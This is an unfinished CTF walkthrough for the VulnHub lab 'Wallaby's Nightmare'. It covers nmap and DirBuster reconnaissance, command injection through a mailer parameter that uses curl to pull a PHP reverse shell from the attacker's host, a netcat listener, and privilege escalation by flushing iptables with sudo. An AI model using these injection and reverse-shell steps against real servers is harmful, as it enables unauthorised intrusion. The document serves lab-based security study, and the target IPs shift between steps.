# Wallaby's: Nightmare (v1.0.2)

https://www.vulnhub.com/entry/wallabys-nightmare-v102,176/

TODO 

We do a netdiscover to find `192.168.1.102` and do an nmap scan

```
root@kali:~# nmap -sC -sV -p- -A -T4 192.168.1.103

Starting Nmap 7.60 ( https://nmap.org ) at 2017-10-13 18:48 BST
Nmap scan report for ubuntu.home (192.168.1.103)
Host is up (0.00013s latency).
Not shown: 65532 closed ports, 1 filtered port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6e:07:fc:70:20:98:f8:46:e4:8d:2e:ca:39:22:c7:be (RSA)
|   256 99:46:05:e7:c2:ba:ce:06:c4:47:c8:4f:9f:58:4c:86 (ECDSA)
|_  256 4c:87:71:4f:af:1b:7c:35:49:ba:58:26:c1:df:b8:4f (EdDSA)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Wallaby's Server
MAC Address: 00:0C:29:D4:C5:A0 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.8
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.13 ms ubuntu.home (192.168.1.103)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.18 seconds
```

We view the browser and see an input a username. Following the game, we asked to fuzz. I tried a simple LFI code injection to be met with a message saying that I was caught and difficulty increased. Revisiting the site didn't work, so we do nmap scan again and see it has moved ports `http://192.168.1.103:60080/`

Now we do some fuzzing, using wfuzz gives all results 200, so we switch to dirbuster

```
root@kali:~# dirbuster
Starting OWASP DirBuster 1.0-RC1
Starting URL fuzz
Starting fuzz on http://192.168.1.103:60080/index.php?page={dir}
Dir found: /index.php?page=contact - 200
Dir found: /index.php?page=home - 200
Dir found: /index.php?page=index - 200
Dir found: /index.php?page=%27 - 200
Dir found: /index.php?page=index - 200
Dir found: /index.php?page=mailer - 200
Dir found: /index.php?page=blacklist - 200
Dir found: /index.php?page=who%27s-connecting - 200
```

Going through all of them, we see that mailer can execute http://192.168.1.103:60080/index.php?page=mailer&mail=whoami. We can try ncat with -e or even without e or php reverse shell. `http://192.168.1.68:60080/index.php?page=mailer&mail=curl http://192.168.1.88/shell.php > shell.php; chmod 777 shell.php; ls -al` and `nc -lvp 1234`...


### Privelege Escalation
I have read that dirty cow works which is kind of the goto exploit. Alternatively, running `sudo -l` we see that we can run vim for waldo (e.g. sudo -u waldo usr/bin/vim ...) and iptables for all (e.g. sudo /sbin/iptables ...). We can see the firewall rules `sudo /sbin/iptables -L`

```
www-data@ubuntu:$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (waldo) NOPASSWD: /usr/bin/vim /etc/apache2/sites-available/000-default.conf
    (ALL) NOPASSWD: /sbin/iptables
    
www-data@ubuntu:$ sudo /sbin/iptables -L
sudo /sbin/iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination
ACCEPT     tcp  --  localhost            anywhere             tcp dpt:ircd
DROP       tcp  --  anywhere             anywhere             tcp dpt:ircd

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination

www-data@ubuntu:$ sudo /sbin/iptables --flush
```

Now that we have removed the rules, we should see that the 6667 port for IRC is unblocked and we can connect to it. We also find the logs file for `#wallabyschat` in wallaby home directory. We also see from the directory, the module folder responsible for the bot in the IRC. If we log in to IRC and run .help, we can see the list of commands.
